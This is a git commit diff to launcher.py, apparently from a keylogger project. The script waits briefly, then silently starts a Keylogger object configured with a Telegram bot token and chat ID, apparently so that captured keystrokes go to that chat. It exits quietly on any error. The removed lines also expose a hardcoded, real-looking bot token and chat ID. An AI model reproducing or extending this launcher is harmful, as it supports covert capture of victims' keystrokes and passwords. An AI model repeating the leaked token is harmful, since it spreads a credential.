b1c622d8c27687427f3fd9c1eecf52c6bf4b3cc7
Defopticon IT <defopticon@protonmail.com>
2022-03-16 11:34:24 +0100

    Update launcher.py

--- launcher.py
+++ launcher.py
@@ -1,13 +1,14 @@
 #!/usr/bin/python
 import keylogger, time, sys
 
-bot_token = "5147964634:AAEFvnLASTNzDsaFUZubZ7eRhSQHqhR47AM"
-chat_id = "1101598174"
+bot_token = ""
+chat_id = ""
+interval_time = 40
 
 time.sleep(10)
 
 try:
-	my_keylogger = keylogger.Keylogger(40, bot_token, chat_id)
+	my_keylogger = keylogger.Keylogger(interval_time, bot_token, chat_id)
 	my_keylogger.start()
 except Exception:
 	sys.exit()
